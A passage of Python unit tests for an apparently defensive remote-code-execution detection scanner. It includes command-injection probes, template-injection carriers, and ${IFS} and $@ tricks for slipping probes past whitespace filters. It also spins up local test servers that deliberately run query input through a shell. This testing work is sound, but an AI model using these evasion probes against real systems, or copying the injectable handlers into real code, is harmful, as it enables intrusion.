        self.assertFalse([r for r in bare if r["verdict"] == "executed"],
                         "precondition: without the credential the handler refuses")

    def test_a_clean_target_stays_negative_through_the_new_channel(self):
        import tempfile
        writedir = shell_writable_dir()
        with local_target(lambda *a: (200, "<html>static</html>")) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/?host=FUZZ", methods=["file"],
                config={"file_write_path": writedir,
                        "file_read_url": base + "/download?f={path_enc}"}, timeout=15)
        self.assertFalse([r for r in results if r["verdict"] == "executed"])


class EvalCarrierOperandTestCase(unittest.TestCase):
    """A carrier may need the operands, not the joined expression.

    Every carrier until now substituted `__EXPR__` -- the whole `a*b` -- which
    silently assumed the engine has an arithmetic operator. Two that do not,
    and that are measured false negatives today, compute through a filter and
    a tag instead:

        liquid    {{ 45013 | times: 45989 }}      -> 2070102857
        django    {% widthratio 45013 1 45989 %}  -> 2070102857

    Neither can be written with the joined expression at all, so an
    application that really does evaluate the template was reported negative.
    That is the same shape as `oob` on a `${jndi:...}` sink: probes that reach
    the target and cannot speak its language.
    """

    def setUp(self):
        self.rec = make_record(environment="unix", context="raw")
        self.gen = RCEKit()

    def _probes(self, carriers=None, config=None):
        import random
        gen = self.gen
        if carriers is not None:
            gen.eval_carriers = carriers
        method = rcekit.EvalExpr(gen, config or {})
        return method.build_probes(self.rec, random.Random(7))

    def _by_carrier(self, probes):
        return {p.carrier: p for p in probes if p.carrier}

    def test_the_operands_are_substituted_apart(self):
        probes = self._probes({"t": {"engines": ["t"],
                                     "template": "A=__A__ B=__B__"}})
        probe = self._by_carrier(probes)["t"]
        a, b = probe.payload.replace("A=", "").split(" B=")
        self.assertEqual(int(a) * int(b), int(probe.expected),
                         f"the operands do not multiply to the expected value: {probe.payload}")

    def test_the_joined_expression_still_works(self):
        # Backward compatibility: the three shipped carriers use it.
        probe = self._by_carrier(self._probes({
            "t": {"engines": ["t"], "template": "<<__EXPR__>>"}}))["t"]
        self.assertRegex(probe.payload, r"^<<\d+\*\d+>>$")

    def test_a_carrier_may_use_both(self):
        probe = self._by_carrier(self._probes({
            "t": {"engines": ["t"], "template": "__EXPR__|__A__|__B__"}}))["t"]
        expr, a, b = probe.payload.split("|")
        self.assertEqual(expr, f"{a}*{b}")

    def test_a_carrier_with_no_token_is_not_sent(self):
        """A constant payload cannot confirm, so sending it only costs a request.

        Its operands would not be random to the run, so the product would not be
        evidence the target computed anything -- and a probe that cannot confirm
        still counts toward the coverage a run reports."""
        probes = self._probes({"bad": {"engines": ["bad"], "template": "no tokens here"}})
        self.assertEqual(self._by_carrier(probes), {})

    def test_a_carrier_with_only_one_operand_is_not_sent_either(self):
        """One operand is no better than none.

        The target is never handed the other, so nothing it can compute is the
        product RCEKit is looking for. The corpus test catches this for the
        shipped carriers; this is the runtime guard, which is what a
        `--template-file` a user wrote goes through."""
        for template in ("{{ __A__ }}", "{{ times: __B__ }}"):
            with self.subTest(template=template):
                probes = self._probes({"half": {"engines": ["half"],
                                                "template": template}})
                self.assertEqual(self._by_carrier(probes), {},
                                 f"{template} cannot produce a product and was sent")

    def test_the_shipped_carriers_render_their_measured_form(self):
        probes = self._probes()          # the real corpus
        rendered = {name: p.payload for name, p in self._by_carrier(probes).items()}
        self.assertIn("liquid", rendered)
        self.assertIn("django", rendered)
        self.assertRegex(rendered["liquid"], r"^\{\{ \d+ \| times: \d+ \}\}$")
        self.assertRegex(rendered["django"], r"^\{% widthratio \d+ 1 \d+ %\}$")

    def test_a_filter_carrier_never_carries_the_product_itself(self):
        """The payload must not contain the answer.

        If it did, a target that merely echoed the payload would return the
        expected value and read as `executed` -- reflection forging execution,
        which is the one thing this oracle exists to prevent."""
        for name, probe in self._by_carrier(self._probes()).items():
            self.assertNotIn(probe.expected, probe.payload,
                             f"the {name} carrier hands the target its own answer")

    def test_eval_engines_still_narrows_to_a_new_carrier(self):
        probes = self._probes(config={"eval_engines": ("liquid",)})
        self.assertEqual(set(self._by_carrier(probes)), {"liquid"})


class EvalCarrierCorpusTestCase(unittest.TestCase):
    """A carrier is a measured false negative, never a precaution.

    The rule is written in `build_probes`: carriers exist "for the engines that
    do NOT return a bare product from a bare expression". A carrier shipped on
    a guess costs a request per context on every run for an engine the bare
    forms already cover, and nothing would ever say so.
    """

    @classmethod
    def setUpClass(cls):
        cls.carriers = RCEKit().eval_carriers

    def test_every_carrier_records_the_measurement_behind_it(self):
        for name, carrier in self.carriers.items():
            self.assertTrue(str(carrier.get("verified") or "").strip(),
                            f"the {name} carrier ships without a `verified` note")

    def test_a_verified_note_names_a_version(self):
        # "it worked once" is not a measurement; the engine build is the claim.
        for name, carrier in self.carriers.items():
            self.assertRegex(carrier["verified"], r"\d+\.\d+",
                             f"the {name} carrier's `verified` note names no version")

    def test_every_carrier_declares_the_engines_it_is_for(self):
        for name, carrier in self.carriers.items():
            self.assertTrue(carrier.get("engines"),
                            f"the {name} carrier names no engine")

    def test_the_survey_records_what_did_not_need_a_carrier(self):
        """The measurements that produced nothing are worth as much as the ones
        that did -- without them the next person re-runs the same survey."""
        data = json.loads((REPO_ROOT / "templates" / "payloads.json").read_text(
            encoding="utf-8"))
        self.assertIn("eval_carrier_survey", data)
        self.assertTrue(data["eval_carrier_survey"].get("bare_form_sufficient"))
        self.assertTrue(data["eval_carrier_survey"].get("out_of_reach"))


class DetectionQuestionTestCase(unittest.TestCase):
    """Two methods that answer the same question are not two findings.

    `reflected`, `eval`, `file`, `write`, `oob` and `time` all ask *did this
    target execute my input* and differ only in how hard they look. `lookup`
    and `deser` ask something else, and their answers stand whatever execution
    turned out to be.

    The driver used to decide this from a set of method names on the
    expensive side of a cost split, so `lookup` and `deser` were skipped on a
    candidate that had confirmed -- as though a lookup sink were a second name
    for the RCE rather than a separate property with its own remediation.

    Then it decided it from the tier instead, which is the same mistake one
    step in: a tier says how strong an answer a method can reach, and renaming
    one moved the method out of the execution group. `time` is what that costs
    -- it asks the execution question, cannot reach the strongest answer to it,
    and is the single most expensive method to run for a second name on a
    finding `reflected` already proved.
    """

    # The partition itself, written out. Not derived from any attribute the
    # implementation happens to use, because deriving it is what went wrong
    # twice: a test that recomputes the grouping rule agrees with the rule
    # whatever the rule became.
    EXPECTED_GROUPS = (
        ("reflected", "eval", "file", "write", "oob", "time", "boolean"),
        ("lookup",),
        ("deser",),
    )

    def test_the_methods_group_into_exactly_these_questions(self):
        grouped = {}
        for name in rcekit.DETECTION_METHODS:
            grouped.setdefault(rcekit.detection_question(name), set()).add(name)
        self.assertEqual(
            sorted(map(sorted, grouped.values())),
            sorted(map(sorted, (set(g) for g in self.EXPECTED_GROUPS))),
            f"the question partition moved: {grouped}")

    def test_time_asks_the_same_question_as_the_method_that_replaces_it(self):
        """The regression a declared question exists to prevent.

        `time` sleeps for every probe. Dropping out of `reflected`'s group
        means a candidate `reflected` has already proven still pays for the
        sleeps, and the finding gained is a second name for the first one."""
        for weaker in ("time", "boolean"):
            self.assertEqual(rcekit.detection_question(weaker),
                             rcekit.detection_question("reflected"),
                             f"{weaker} left the execution group")

    def test_a_methods_question_does_not_follow_its_tier(self):
        """The two axes are independent, and one case of each proves it.

        `time` shares a question with `reflected` and not a tier; `lookup`
        shares neither. A rework that made the question track the tier again
        would break exactly one of these two."""
        methods = rcekit.DETECTION_METHODS
        self.assertNotEqual(methods["time"].tier, methods["reflected"].tier)
        self.assertEqual(rcekit.detection_question("time"),
                         rcekit.detection_question("reflected"))
        self.assertNotEqual(rcekit.detection_question("lookup"),
                            rcekit.detection_question("reflected"))

    def test_the_sink_methods_ask_something_execution_cannot_answer(self):
        # The counterexample the split exists for.
        self.assertNotEqual(rcekit.detection_question("lookup"), "execution")
        self.assertNotEqual(rcekit.detection_question("deser"), "execution")
        self.assertEqual(rcekit.detection_question("time"), "execution")
        self.assertEqual(rcekit.detection_question("oob"), "execution")

    def test_the_cheap_set_is_read_from_the_classes(self):
        """Every hand-written list naming methods in this repository has gone
        stale, and this one had put `lookup` and `deser` where being skipped
        cost findings rather than requests."""
        self.assertEqual(
            rcekit.CHEAP_DETECTION_METHODS,
            {name for name, cls in rcekit.DETECTION_METHODS.items() if not cls.costly})
        self.assertEqual(rcekit.CHEAP_DETECTION_METHODS, {"reflected", "eval"})

    def test_a_costly_method_says_so_on_its_own_class(self):
        for name in ("file", "write", "time", "oob", "lookup", "deser", "boolean"):
            self.assertTrue(rcekit.DETECTION_METHODS[name].costly, name)
        for name in ("reflected", "eval"):
            self.assertFalse(rcekit.DETECTION_METHODS[name].costly, name)

    def test_a_method_whose_series_is_its_answer_is_costly(self):
        """`costly` decides which wave the enumeration driver runs first, and
        the question it is really asking is whether one probe buys an answer.

        For every method before `boolean` that was the same question as "does
        one probe cost more than one response", because each probe was also a
        unit of information. `boolean` fires ordinary requests and none of them
        means anything alone -- the answer is the partition across the series.
        Read the other way it would sit in the wave that exists to be answered
        cheaply, ahead of `reflected` and `eval` and spending the same
        per-question budget, at 27 requests before it can say a word."""
        for name, method in rcekit.DETECTION_METHODS.items():
            if not method.aggregate:
                continue
            with self.subTest(method=name):
                self.assertTrue(
                    method.costly,
                    f"{name} decides from a whole series but claims one probe is enough")


class CostLineQuestionTestCase(unittest.TestCase):
    """The cost line has to describe the run it precedes.

    `--max-payloads` is granted once per question, so counting it once while
    the run hands it out for every question advertised 44 requests for a run
    that sent 80. That line is the only thing an operator bounding a monitored
    engagement has to go on before the traffic starts, and it was wrong in the
    direction that matters -- under, not over.

    It went out in a measured run I printed and read past, which is the case
    for checking it rather than looking at it.
    """

    def _cost_line(self, methods, max_payloads):
        with local_target(lambda *a: (200, "<html>static</html>")) as base:
            request = (f"POST /x HTTP/1.1\r\nHost: {base.split('//')[1]}\r\n"
                       "Content-Type: application/x-www-form-urlencoded\r\n\r\na=1&b=2")
            # newline="" or Windows turns the CRLFs already in the string
            # into CRCRLF and the capture no longer parses.
            with tempfile.NamedTemporaryFile("w", suffix=".req", delete=False,
                                             encoding="utf-8", newline="") as handle:
                handle.write(request)
                path = handle.name
            try:
                result = subprocess.run(
                    [sys.executable, str(SCRIPT), "-r", path, "--auto-params", "form",
                     "--methods", methods, "--acknowledge-consent",
                     "--max-payloads", str(max_payloads), "--verify-timeout", "2"],
                    cwd=str(REPO_ROOT), capture_output=True, text=True, timeout=300)
            finally:
                os.unlink(path)
        line = next((l for l in result.stdout.splitlines() if "[detect] cost:" in l), "")
        self.assertTrue(line, f"no cost line in:\n{result.stdout[-2000:]}")
        sent = next((l for l in result.stdout.splitlines() if "probes:" in l), "")
        return line, sent, result.stdout

    def test_the_estimate_counts_every_question_the_run_will_ask(self):
        """Two questions cost two allowances, and the line says so."""
        one, _sent, _out = self._cost_line("reflected,time", 6)
        two, _sent2, _out2 = self._cost_line("reflected,deser", 6)
        per_one = int(re.search(r"~(\d+) probes", one).group(1))
        per_two = int(re.search(r"~(\d+) probes", two).group(1))
        self.assertGreater(
            per_two, per_one,
            "a run asking two questions is estimated as though it asked one:\n"
            f"  reflected,time  -> {one}\n  reflected,deser -> {two}")

    def test_the_line_names_how_many_questions_are_being_asked(self):
        line, _sent, _out = self._cost_line("reflected,deser", 6)
        self.assertIn("2 question(s) asked", line, line)

    def test_methods_answering_one_question_are_not_counted_twice(self):
        # `time` looks harder for the same thing `reflected` looks for, so
        # naming both must not double the estimate.
        line, _sent, _out = self._cost_line("reflected,time", 6)
        self.assertIn("1 question(s) asked", line, line)


class ConfirmDepthTestCase(unittest.TestCase):
    """A carrier that has confirmed has nothing left to say.

    One carrier is one (method, environment, context). Measured against a
    target that executes: a candidate spent 115 of its 120 probes after the
    first confirmation and printed 32 confirmations, 29 of which were
    duplicates inside one carrier. Those probes were not merely wasted -- they
    were spent instead of reaching carriers that were never examined at all.

    The stop is per carrier and never per candidate. A candidate may confirm as
    `unix` while a later `nodejs` carrier is the only thing a different target
    would have shown; stopping the candidate would take that away, and a run
    that stops looking reads exactly like a target with nothing left to find.
    """

    def setUp(self):
        self.gen = RCEKit()
        self.records = [make_record(environment="unix", context="raw"),
                        make_record(environment="nodejs", context="raw")]

    @contextlib.contextmanager
    def _target(self):
        """The same executing sink the ReflectedMath test uses: /vuln runs the
        injected string through a shell, /reflect echoes it without running
        it."""
        import http.server
        import socketserver
        import threading
        import urllib.parse as up

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                parsed = up.urlparse(self.path)
                cmd = up.parse_qs(parsed.query).get("cmd", [""])[0]
                self.send_response(200)
                self.end_headers()
                if parsed.path == "/vuln":
                    pipe = sh_popen("echo " + cmd + " 2>&1")
                    out = pipe.read()
                    pipe.close()
                else:
                    out = cmd
                try:
                    self.wfile.write(out.encode(errors="replace"))
                except BrokenPipeError:
                    pass

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            yield f"http://127.0.0.1:{server.server_address[1]}"
        finally:
            server.shutdown()
            server.server_close()

    def _run(self, path="/vuln", confirm_depth=None):
        config = {"confirm_depth": confirm_depth} if confirm_depth else {}
        with self._target() as base:
            return self.gen.run_detection(
                list(self.records), url=f"{base}{path}?cmd=FUZZ", methods=["reflected"],
                config=config, timeout=15)

    def test_a_carrier_stops_at_its_first_confirmation(self):
        results = self._run()
        import collections
        per_carrier = collections.Counter(
            (r["method"], r["environment"], r["context"]) for r in results
            if r["verdict"] == "executed")
        self.assertTrue(per_carrier, "precondition: the target must confirm")
        self.assertEqual(set(per_carrier.values()), {1},
                         f"a carrier confirmed more than once: {per_carrier}")

    def test_every_carrier_still_gets_its_own_chance(self):
        # The distinction the whole change rests on: per carrier, never per
        # candidate.
        results = self._run()
        confirmed = {r["environment"] for r in results if r["verdict"] == "executed"}
        self.assertGreater(len(confirmed), 1,
                           f"only one environment was examined: {confirmed}")

    def test_the_run_says_how_many_shapes_it_held_back(self):
        # A ladder that shrinks quietly is indistinguishable from a target with
        # nothing left to find, which is why the other three tallies exist.
        self._run()
        self.assertGreater(self.gen.settled_probes, 0)
        self.assertTrue(self.gen.settled_carriers)
        self.assertTrue(any("reflected/unix/raw" == k for k in self.gen.settled_carriers),
                        f"the carrier that stopped is not named: {self.gen.settled_carriers}")

    def test_every_maps_every_shape_the_sink_accepts(self):
        """The escape hatch, for an operator writing a proof of concept by hand.

        Without it the default would be the only behaviour, and which
        separators and quoting a sink accepts would stop being knowable."""
        stopped = self._run()
        gen_first = self.gen
        self.gen = RCEKit()
        exhaustive = self._run(confirm_depth="every")
        self.assertGreater(len(exhaustive), len(stopped))
        self.assertEqual(self.gen.settled_probes, 0)
        self.assertGreater(gen_first.settled_probes, 0)

    def test_nothing_is_held_back_on_a_target_that_never_confirms(self):
        # The stop is triggered by a confirmation and by nothing else; a clean
        # candidate must still get every shape.
        self._run(path="/reflect")
        self.assertEqual(self.gen.settled_probes, 0)
        self.assertEqual(self.gen.settled_carriers, {})

    def test_a_second_order_confirmation_settles_the_carrier_too(self):
        """The stop has to read the verdict the run ends up reporting.

        With `--observe-url` a probe can be negative in the response it drew and
        `executed` on the observed channel a moment later. Deciding the stop
        from the pre-poll verdict left the carrier running after it had in fact
        confirmed, spending the budget the stop exists to hand to carriers not
        yet examined -- the coverage loss this change was written to remove,
        reappearing on the one oracle that needs a second request to answer.
        """
        import http.server
        import socketserver
        import threading
        import urllib.parse as up

        stored = {"value": ""}

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                parsed = up.urlparse(self.path)
                self.send_response(200)
                self.end_headers()
                if parsed.path == "/store":
                    # Swallows the payload: nothing comes back in this response,
                    # so every probe reads negative here.
                    cmd = up.parse_qs(parsed.query).get("cmd", [""])[0]
                    pipe = sh_popen("echo " + cmd + " 2>&1")
                    stored["value"] = pipe.read()
                    pipe.close()
                    out = "stored"
                else:                      # /observe renders what was stored
                    out = stored["value"]
                try:
                    self.wfile.write(out.encode(errors="replace"))
                except BrokenPipeError:
                    pass

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            base = f"http://127.0.0.1:{server.server_address[1]}"
            results = self.gen.run_detection(
                [make_record(environment="unix", context="raw")],
                url=f"{base}/store?cmd=FUZZ", methods=["reflected"],
                config={"observe_url": f"{base}/observe"}, timeout=15)
        finally:
            server.shutdown()
            server.server_close()
        import collections
        per_carrier = collections.Counter(
            (r["method"], r["environment"], r["context"]) for r in results
            if r["verdict"] == "executed")
        self.assertTrue(per_carrier, "precondition: the observed channel must confirm")
        self.assertTrue(all("OBSERVED" in r["detail"] for r in results
                            if r["verdict"] == "executed"),
                        "precondition: the confirmation must come from the poll")
        self.assertEqual(set(per_carrier.values()), {1},
                         "a carrier kept probing after it had confirmed on the "
                         f"observed channel: {per_carrier}")
        self.assertGreater(self.gen.settled_probes, 0)

    def test_the_four_tallies_stay_apart(self):
        """Four numbers because they say four different things.

        A profile drop means the probe could not have reached the sink. A
        safety hold means it could and was not sent. A reach note means it went
        further than the tier asked. This one means it could have been sent and
        there was nothing left for it to establish."""
        self._run()
        self.assertGreater(self.gen.settled_probes, 0)
        self.assertEqual(self.gen.profile_dropped_probes, 0)
        self.assertEqual(self.gen.safety_held_probes, 0)


class SecondOrderAdviceTestCase(unittest.TestCase):
    """The one flag that works was the one flag never named.

    Measured against a target that stores on one endpoint and renders through a
    shell on another -- a real RCE. Every probe read `negative`, and the run
    answered with four methods, all of which are also negative there because
    the execution does not happen on the request being measured:

        --methods time   -> negative=4
        --observe-url    -> confirmed, first run

    Worse, that list was gated on `selected <= {reflected, eval}`, so an
    operator who had already tried the expensive methods -- exactly the one
    with nothing left but second order -- was told only that the target might
    be patched.
    """

    def _advice(self, results, observe=None):
        return "\n".join(rcekit.second_order_advice(observe, results))

    def test_it_names_the_flag_and_the_captured_request_form(self):
        joined = self._advice([{"verdict": "negative", "reflected_verbatim": False}])
        self.assertIn("--observe-url", joined)
        self.assertIn("--observe-request", joined)

    def test_it_is_not_gated_on_which_methods_have_run(self):
        """The blind-sink list is; this is not, and that is the point.

        No method rules out "the execution happens elsewhere", so the run that
        has tried everything is the one that most needs to hear it."""
        for results in ([{"verdict": "negative", "reflected_verbatim": False}],
                        [{"verdict": "negative"}],
                        [{"verdict": "negative", "reflected_verbatim": True}]):
            with self.subTest(results=results):
                self.assertTrue(self._advice(results))

    def test_a_named_channel_is_not_suggested_again(self):
        results = [{"verdict": "negative", "reflected_verbatim": False}]
        self.assertEqual(self._advice(results, observe={"url": "http://t/p"}), "")

    def test_the_wording_follows_what_the_run_observed(self):
        echoed = self._advice([{"verdict": "negative", "reflected_verbatim": True}])
        swallowed = self._advice([{"verdict": "negative", "reflected_verbatim": False}])
        self.assertIn("returned your input verbatim", echoed)
        self.assertIn("returned none of it", swallowed)
        self.assertNotEqual(echoed, swallowed)

    def test_an_unmeasured_run_claims_neither(self):
        """An aggregate method decides from a series and records no per-probe
        observation, so a run of `time` alone knows nothing about what came
        back. Saying the input was swallowed on that evidence would be the
        guess this advice exists to avoid."""
        joined = self._advice([{"verdict": "negative"}])
        self.assertNotIn("returned none of it", joined)
        self.assertNotIn("returned your input verbatim", joined)
        self.assertIn("may not be happening on the request being measured", joined)

    def test_one_echoing_probe_is_enough_to_say_so(self):
        joined = self._advice([{"verdict": "negative", "reflected_verbatim": False},
                               {"verdict": "negative", "reflected_verbatim": True}])
        self.assertIn("returned your input verbatim", joined)


class ReflectedVerbatimRecordTestCase(unittest.TestCase):
    """Whether the input came back is observed, not assumed.

    It was already computed on the confirmed path, where it becomes "target
    also reflects the payload verbatim". A negative probe never looked -- and
    the negative run is the one that has to say what it saw.
    """

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="raw")

    def _run(self, route):
        with local_target(route) as base:
            return self.gen.run_detection(
                [self.rec], url=f"{base}/x?q=FUZZ", methods=["reflected"],
                max_payloads=4, timeout=15)

    def test_a_target_that_echoes_is_recorded_as_echoing(self):
        # `params` is a flat dict: `[0]` here would echo the first character.
        results = self._run(lambda m, p, params, h, b: (200, params.get("q", "")))
        self.assertTrue(results)
        self.assertTrue(any(r.get("reflected_verbatim") for r in results),
                        "an echoing target was not recorded as echoing")

    def test_a_carrier_payload_counts_as_the_payload(self):
        """Measured against what actually went out, not against `forbidden`.

        A carrier that multiplies through a filter never spells the joined
        `a*b` out -- Liquid sends `{{ a | times: b }}` and Django
        `{% widthratio a 1 b %}` -- so an endpoint echoing the whole payload
        recorded a measured False. A target profile that filters the `*` shapes
        leaves only those, and the run would then report "returned none of it"
        about a target that returned everything."""
        with local_target(lambda m, p, params, h, b: (200, params.get("q", ""))) as base:
            results = self.gen.run_detection(
                [make_record(environment="java", context="raw")],
                url=f"{base}/x?q=FUZZ", methods=["eval"], timeout=15)
        carried = [r for r in results
                   if "times:" in r["payload"] or "widthratio" in r["payload"]]
        self.assertTrue(carried, "precondition: the operand carriers must be sent")
        missed = [r["payload"] for r in carried if not r.get("reflected_verbatim")]
        self.assertFalse(
            missed, f"an echoing target was not recorded as echoing: {missed[:2]}")

    def test_a_delivery_error_records_no_observation_at_all(self):
        """There was no response to look at, so False would be a claim.

        A mixed run where these requests fail while an aggregate method returns
        an ordinary negative would otherwise have the advice say the target
        accepted the input and returned none of it -- about probes that never
        arrived."""
        results = self.gen.run_detection(
            [self.rec], url="http://127.0.0.1:1/x?q=FUZZ", methods=["reflected"],
            max_payloads=2, timeout=3)
        self.assertTrue(results)
        self.assertEqual([r["verdict"] for r in results], ["error"] * len(results))
        self.assertFalse(any("reflected_verbatim" in r for r in results),
                         "a probe that never arrived recorded an observation")
        advice = "\n".join(rcekit.second_order_advice(None, results))
        self.assertIn("may not be happening on the request being measured", advice)
        self.assertNotIn("returned none of it", advice)

    def test_a_target_that_swallows_the_input_is_recorded_as_swallowing(self):
        results = self._run(lambda *a: (200, "<html>saved</html>"))
        self.assertTrue(results)
        self.assertTrue(all(r.get("reflected_verbatim") is False for r in results),
                        "a target that returned nothing was recorded as echoing")


class EvasionRungTestCase(unittest.TestCase):
    """A rung transforms the payload without breaking it.

    The shipped `low` rung substituted `${IFS}` for every space, including the
    ones inside a quoted program: `awk 'BEGIN{print "RK" a+b "RK"}'` became
    `awk${IFS}'BEGIN{print${IFS}"RK"...`, where `${IFS}` is literal text rather
    than an expansion and awk answers with a syntax error. Measured shape by
    shape against an unfiltered target, that cost 8 of the probe shapes the
    canonical form executes and gained none.
    """

    QUOTED = """; awk 'BEGIN{print "RKA" 574354+686963 "RKB"}'"""

    def test_a_quoted_program_keeps_its_spaces(self):
        out = rcekit.evade_spaces(self.QUOTED, "${IFS}")
        self.assertIn("""'BEGIN{print "RKA" 574354+686963 "RKB"}'""", out,
                      f"the substitution went inside the quotes: {out}")
        self.assertNotIn(" awk", out, "the spaces outside the quotes were not replaced")

    def test_a_double_quoted_string_is_left_alone_too(self):
        """`${IFS}` *does* expand inside double quotes, so substituting there
        changes the string the target computes rather than the spacing around
        it."""
        out = rcekit.evade_spaces('echo "a b" c', "${IFS}")
        self.assertIn('"a b"', out)
        self.assertNotIn('" c', out)

    def test_the_command_word_split_stays_outside_an_expansion(self):
        """Applied after the space substitution it lands inside `${IFS}` and
        makes `${I$@FS}`, which is neither an expansion nor a command."""
        out = rcekit.evade_body("; echo RK$((1+2))", "high")
        self.assertNotIn("$@FS", out, out)
        self.assertIn("$@", out, "the command word was not split at all")

    def test_a_word_too_short_to_split_is_left_alone(self):
        self.assertEqual(rcekit.split_command_word("; x 1"), "; x 1")

    def test_each_rung_changes_the_payload(self):
        canonical = "; echo RK$((1+2))"
        low = rcekit.evade_body(canonical, "low")
        high = rcekit.evade_body(canonical, "high")
        self.assertNotIn(" ", low.replace("${IFS}", ""))
        self.assertNotEqual(low, high)
        self.assertEqual(rcekit.evade_body(canonical, "none"), canonical)

    def test_every_rung_is_in_the_ladder(self):
        self.assertEqual(rcekit.EVASION_RUNGS[0], "none",
                         "the ladder must start canonical")
        self.assertIn("low", rcekit.EVASION_RUNGS)
        self.assertIn("high", rcekit.EVASION_RUNGS)


class EscalationTestCase(unittest.TestCase):
    """A rung is paid for where a filter refused, and nowhere else.

    Measured: applying one to every probe broke 8 probe shapes against an
    unfiltered target and improved none, while against a filter that blocks
    whitespace it turned 1 confirmation into 5. So the rung is a retry for a
    refused probe rather than a posture for the run.
    """

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="raw")

    def _run(self, route, evade="high"):
        with local_target(route) as base:
            return self.gen.run_detection(
                [self.rec], url=f"{base}/x?cmd=FUZZ", methods=["reflected"],
                config={"evade": evade}, max_payloads=10, timeout=15)

    @staticmethod
    def _whitespace_filter(method, path, params, headers, body):
        value = params.get("cmd", "")
        if any(c in value for c in (" ", "\t", "\n")):
            return (403, "<html>403 blocked</html>")
        return (200, f"out: {value}")

    @staticmethod
    def _open(method, path, params, headers, body):
        return (200, f"out: {params.get('cmd', '')}")

    def test_an_unfiltered_target_is_never_escalated(self):
        # The counterexample for the whole design: no refusal, no retry, no
        # extra request.
        self._run(self._open)
        self.assertEqual(self.gen.escalated_probes, 0)
        self.assertEqual(self.gen.escalation_wins, {})

    def test_a_refused_probe_is_retried(self):
        self._run(self._whitespace_filter)
        self.assertGreater(self.gen.escalated_probes, 0)

    def test_the_retry_gets_through_a_whitespace_filter(self):
        self._run(self._whitespace_filter)
        self.assertTrue(self.gen.escalation_wins,
                        "no rung converted a refusal, so the ladder bought nothing")

    def test_the_ceiling_is_honoured(self):
        self._run(self._whitespace_filter, evade="low")
        self.assertNotIn("high", self.gen.escalation_wins)

    def test_none_disables_the_retry_entirely(self):
        self._run(self._whitespace_filter, evade="none")
        self.assertEqual(self.gen.escalated_probes, 0)

    def test_the_ladder_a_run_builds_does_not_depend_on_the_rung(self):
        """The rung is a retry, so the probes offered are the same either way.

        This is what the old behaviour cost: `--evade low` built a different,
        smaller ladder and 13 fewer of its probes executed."""
        import random as _random
        built = {}
        for rung in rcekit.EVASION_RUNGS:
            gen = RCEKit()
            method = rcekit.ReflectedMath(gen, {"evade": rung})
            built[rung] = [p.payload for p in method.build_probes(
                self.rec, _random.Random(11))]
        self.assertEqual(built["none"], built["low"])
        self.assertEqual(built["none"], built["high"])


class EscalationBoundaryTestCase(unittest.TestCase):
    """Where a rung may be applied, and where applying it manufactures a lie.

    Every one of these was a way for the retry to turn a vulnerable target into
    a `negative` -- which is worse than the `blocked` it was added to replace,
    because `blocked` at least says the run learned nothing.
    """

    def setUp(self):
        self.gen = RCEKit()

    def _refuse_whitespace(self, method, path, params, headers, body):
        value = params.get("cmd", "")
        if any(c in value for c in (" ", "\t", "\n")):
            return (403, "<html>403 blocked</html>")
        return (200, f"out: {value}")

    def _run(self, record, methods=("reflected",), config=None):
        with local_target(self._refuse_whitespace) as base:
            return self.gen.run_detection(
                [record], url=f"{base}/x?cmd=FUZZ", methods=list(methods),
                config=dict(config or {}, evade="high"), max_payloads=8, timeout=15)

    def test_a_windows_probe_is_never_rewritten_with_posix_syntax(self):
        """`${IFS}` and `$@` mean nothing to cmd.exe.

        The transformed payload loses its spaces, so a whitespace filter
        answers 200 and the retry counts as a win -- while cmd.exe cannot run
        it. The probe then reads `negative` instead of `blocked`, and a
        vulnerable target looks clean."""
        self._run(make_record(environment="windows", context="raw"))
        self.assertEqual(self.gen.escalation_wins, {},
                         "a POSIX rung was counted as getting a Windows probe through")

    def test_a_unix_probe_still_escalates(self):
        # The guard is about dialect, not about switching escalation off.
        self._run(make_record(environment="unix", context="raw"))
        self.assertGreater(self.gen.escalated_probes, 0)

    def test_a_quote_breakout_context_is_transformed(self):
        """The payload opens by *closing* the application\'s quote.

        Reading that leading quote as an opener left the whole body untouched,
        so the rung did nothing on exactly the contexts a filter is most likely
        to sit in front of."""
        for context in ("shell_single_quoted", "shell_double_quoted"):
            with self.subTest(context=context):
                wrapped = rcekit.evade_body(
                    "'; echo RK$((1+2)) #" if "single" in context
                    else '"; echo RK$((1+2)) #',
                    "high", opens_closed=True)
                self.assertIn("${IFS}", wrapped, wrapped)
                self.assertIn("$@", wrapped, wrapped)

    def test_a_quote_that_really_opens_is_still_respected(self):
        # Without the flag the leading quote opens, which is what a quoted
        # program inside a payload does.
        untouched = rcekit.evade_body("awk 'BEGIN{print 1 + 2}'", "low")
        self.assertIn("'BEGIN{print 1 + 2}'", untouched,
                      "the quoted program lost its spaces")


class RedirectIsNeverRetriedTestCase(unittest.TestCase):
    """A shape whose command redirects stays canonical.

    The build-time transform took an explicit `evade=False` for these, and that
    parameter stopped doing anything the moment the rung became a retry -- a
    guard lost in the move rather than removed on purpose. It is enforced where
    the retry now happens.
    """

    def setUp(self):
        self.gen = RCEKit()

    def test_a_file_probe_is_not_retried(self):
        import random as _random
        record = make_record(environment="unix", context="raw")
        method = rcekit.FileBased(self.gen, {"webroot": "/var/www",
                                             "web_base_url": "http://t"})
        probes = method.build_probes(record, _random.Random(1))
        self.assertTrue(probes, "precondition: the method must build probes")
        self.assertTrue(all(">" in p.payload for p in probes),
                        "precondition: these are the redirect shapes")
        self.gen.config_evade = "high"
        self.gen.contexts = {}
        for probe in probes[:2]:
            with self.subTest(payload=probe.payload[:40]):
                self.assertIsNone(self.gen._escalate(
                    method, probe, record, "http://127.0.0.1:1/x", "GET", None,
                    None, "query_value", "raw", 1.0, 200))
        self.assertEqual(self.gen.escalated_probes, 0)

    def test_the_followup_is_read_again_after_a_retry_that_lands(self):
        """`file` writes its token on the request that arrives.

        A followup fetched before the retry is a read of a file that did not
        exist yet. The redirect guard above means `file` itself is never
        retried, so this pins the rule for any method that carries a followup
        without a redirect."""
        source = (REPO_ROOT / "rcekit.py").read_text(encoding="utf-8")
